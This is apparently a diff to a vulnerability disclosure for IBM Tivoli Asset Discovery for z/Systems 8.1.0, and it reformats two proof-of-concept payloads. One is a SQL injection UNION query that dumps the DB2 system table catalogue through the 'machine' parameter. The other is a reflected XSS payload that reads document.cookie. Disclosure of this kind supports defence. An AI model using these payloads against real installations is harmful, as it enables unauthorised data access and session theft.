@@ -15,7 +15,7 @@ http://example.com/asset/lpar_resources?monthfrom=&monthto=&machine=x%2527)%253B
 ```
 Payload on the 'machine' parameter:
 ```
-x')+union+select+0,creator,dbname,name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','2018-08-01','0'+from+sysibm.systables;+--
+x') union select 0,creator,dbname,name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','2018-08-01','0' from sysibm.systables; --
 ```
 
 ### Reflected XSS on Tivoli Asset Discovery for z/Systems version 8.1.0:
@@ -26,7 +26,7 @@ A POC on 'lpar_resources' page:
 <br>
 Payload:
 ```
-%22%3Cimg+src=1+onerror=alert(document.cookie)%3E
+%22%3Cimg src=1+onerror=alert(document.cookie)%3E
 ```
 In the full URL:
 ```
